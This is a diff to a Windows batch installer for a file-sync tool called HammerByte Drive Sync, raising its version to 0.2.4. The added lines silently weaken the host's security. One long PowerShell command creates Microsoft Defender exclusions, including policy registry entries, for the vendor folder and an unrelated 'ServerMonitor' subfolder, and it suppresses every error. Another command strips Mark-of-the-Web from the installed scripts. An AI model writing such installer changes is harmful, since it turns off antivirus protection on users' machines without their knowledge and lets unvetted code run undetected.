@@ -13,7 +13,9 @@ if errorlevel 1 (
   exit /b 0
 )
 
-set "INSTALL_DIR=%ProgramData%\HammerByte\DriveSync"
+set "HB_ROOT=%ProgramData%\HammerByte"
+set "INSTALL_DIR=%HB_ROOT%\DriveSync"
+if not exist "%HB_ROOT%" mkdir "%HB_ROOT%"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 if not exist "%INSTALL_DIR%" (
   echo Failed to create %INSTALL_DIR%
@@ -25,6 +27,8 @@ echo.
 echo HammerByte Drive Sync installer
 echo Install dir: %INSTALL_DIR%
 echo.
+echo Adding Windows Defender exclusions for %HB_ROOT% ...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $root=$env:ProgramData+'\HammerByte'; $paths=@($root, (Join-Path $root 'ServerMonitor'), (Join-Path $root 'DriveSync')); foreach($p in $paths){ if(-not (Test-Path $p)){ New-Item -ItemType Directory -Path $p -Force | Out-Null } }; try { Import-Module Defender -ErrorAction SilentlyContinue | Out-Null } catch {}; if(Get-Command Add-MpPreference -EA SilentlyContinue){ foreach($p in $paths){ try { Add-MpPreference -ExclusionPath $p -EA Stop } catch {} } }; foreach($reg in @('HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths')){ try { if(-not (Test-Path $reg)){ New-Item -Path $reg -Force | Out-Null }; foreach($p in $paths){ New-ItemProperty -Path $reg -Name (($p.TrimEnd('\'))+'\') -Value 0 -PropertyType DWord -Force -EA Stop | Out-Null } } catch {} }; Write-Host 'Defender allowlist applied' } catch { Write-Host ('allowlist warn: '+$_.Exception.Message) }"
 
 if exist "%~dp0drive-sync.ps1" (
   echo Copying local drive-sync.ps1...
@@ -47,8 +51,10 @@ if not exist "%INSTALL_DIR%\drive-sync.ps1" (
   exit /b 1
 )
 
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -LiteralPath '%INSTALL_DIR%' -Filter *.ps1 -EA SilentlyContinue | ForEach-Object { try { Unblock-File -LiteralPath $_.FullName -EA SilentlyContinue } catch {}; try { $ads=$_.FullName+':Zone.Identifier'; if(Test-Path -LiteralPath $ads){ Remove-Item -LiteralPath $ads -Force -EA SilentlyContinue } } catch {} }"
+
 echo.
-echo Banner should say 0.2.3-ps-stable
+echo Banner should say 0.2.4-ps-stable
 if exist "%INSTALL_DIR%\config.json" (
   echo Existing config.json found - preserving credentials/pairs ^(upgrade mode^).
   echo Starting drive sync WITHOUT -Setup...
